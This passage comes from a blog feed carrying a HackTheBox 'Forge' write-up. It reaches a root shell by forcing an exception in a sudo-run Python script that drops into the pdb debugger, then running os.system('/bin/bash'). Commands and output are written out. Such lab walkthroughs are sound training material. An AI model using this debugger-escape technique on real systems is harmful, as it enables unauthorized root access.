+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pdb</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1025</span><span class="p">,</span> <span class="mi">65535</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Listening on localhost:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">(</span><span class="n">clientsock</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Enter the secret passsword: &#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">clientsock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">!=</span> <span class="s1">&#39;secretadminpassword&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Wrong password!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Welcome admin!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">What do you wanna do: </span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[1] View processes</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[2] View free memory</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[3] View listening sockets</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;[4] Quit</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">option</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">clientsock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;ps aux&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;df&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">subprocess</span><span class="o">.</span><span class="n">getoutput</span><span class="p">(</span><span class="s1">&#39;ss -lnt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">option</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">clientsock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Bye</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pdb</span><span class="o">.</span><span class="n">post_mortem</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">__traceback__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">quit</span><span class="p">()</span>
+</span></span></code></pre></div><p>There&rsquo;s a hardcoded password of <code>secretadminpassword</code>. One that stands out in this code is the error/exception handling, where it calls Python debugger (<code>pdb</code>).  Since PDB is an interactive debugger, it is possible to <strong>run Python code</strong> during a debug session.</p>
+<p>To get into that debug session, I need to cause an error to the tool and this can be achieved by sending a SIGINT.</p>
+<h4 id="exploitation">Exploitation</h4>
+<p>First, I&rsquo;ll run the script with <code>sudo</code> and I&rsquo;ll open another SSH sessions</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
+</span></span><span class="line"><span class="cl">Listening on localhost:51411
+</span></span></code></pre></div><p>On the second SSH session, I&rsquo;ll connect to <code>26713</code> using <code>nc</code> and immediately send a SIGINT with <code>CTRL+C</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:~$ nc 127.0.0.1 <span class="m">51411</span>
+</span></span><span class="line"><span class="cl">Enter the secret passsword: secretadminpassword
+</span></span><span class="line"><span class="cl">Welcome admin!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">What <span class="k">do</span> you wanna <span class="k">do</span>: 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span> View processes
+</span></span><span class="line"><span class="cl"><span class="o">[</span>2<span class="o">]</span> View free memory
+</span></span><span class="line"><span class="cl"><span class="o">[</span>3<span class="o">]</span> View listening sockets
+</span></span><span class="line"><span class="cl"><span class="o">[</span>4<span class="o">]</span> Quit
+</span></span><span class="line"><span class="cl">^C
+</span></span></code></pre></div><p>On the first SSH session, it&rsquo;s now has the Pdb prompt (debug session).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@forge:/opt$ sudo /usr/bin/python3 /opt/remote-manage.py
+</span></span><span class="line"><span class="cl">Listening on localhost:51411
+</span></span><span class="line"><span class="cl">invalid literal <span class="k">for</span> int<span class="o">()</span> with base 10: b<span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">&gt; /opt/remote-manage.py<span class="o">(</span>27<span class="o">)</span>&lt;module&gt;<span class="o">()</span>
+</span></span><span class="line"><span class="cl">-&gt; <span class="nv">option</span> <span class="o">=</span> int<span class="o">(</span>clientsock.recv<span class="o">(</span>1024<span class="o">)</span>.strip<span class="o">())</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span>Pdb<span class="o">)</span> 
+</span></span></code></pre></div><p>Since it&rsquo;s a root process, I&rsquo;ve full access now on the system.</p>
+<p><div class="img-container"><img src="imgs/image-20221015130859441.png" alt="image-20221015130859441"  /></div>
+</p>
+<p>I&rsquo;ll run <code>os.system('/bin/bash')</code> to spawn a bash shell and grab the root flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span>Pdb<span class="o">)</span> os.system<span class="o">(</span><span class="s1">&#39;/bin/bash&#39;</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@forge:/opt# ls -l /root/root.txt 
+</span></span><span class="line"><span class="cl">-rw------- <span class="m">1</span> root root <span class="m">33</span> Oct <span class="m">15</span> 03:08 /root/root.txt
+</span></span><span class="line"><span class="cl">root@forge:/opt# 
+</span></span><span class="line"><span class="cl">root@forge:/opt# cat /root/root.txt 
+</span></span><span class="line"><span class="cl">73930b...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Nunchucks</title>
       <link>https://fahmifj.github.io/hackthebox/nunchucks/</link>
